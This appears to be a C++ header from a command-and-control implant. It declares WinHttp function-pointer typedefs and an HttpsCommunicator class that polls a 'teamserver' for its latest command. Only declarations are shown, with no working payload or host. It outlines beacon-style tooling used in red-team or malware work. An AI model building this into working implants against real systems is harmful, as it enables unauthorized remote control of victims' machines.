#pragma once

typedef HINTERNET (WINAPI* WinHttpOpenFunctionPointer)(
	LPCWSTR pszAgentW,
	DWORD   dwAccessType,
	LPCWSTR pszProxyW,
	LPCWSTR pszProxyBypassW,
	DWORD   dwFlags
);

typedef HINTERNET(WINAPI* WinHttpConnectFunctionPointer)(
	HINTERNET     hSession,
	LPCWSTR       pswzServerName,
	INTERNET_PORT nServerPort,
	DWORD         dwReserved
);

typedef HINTERNET(WINAPI* WinHttpOpenRequestFunctionPointer)(
	HINTERNET hConnect,
	LPCWSTR   pwszVerb,
	LPCWSTR   pwszObjectName,
	LPCWSTR   pwszVersion,
	LPCWSTR   pwszReferrer,
	LPCWSTR* ppwszAcceptTypes,
	DWORD     dwFlags
);


class HttpsCommunicator
{
public:
	static enum Method {
		GET,
		POST
	};
	static std::string GetLatestCommand();
private:

	static std::string SendRequest(std::string teamserverIp, HttpsCommunicator::Method method, std::string endpoint);

};

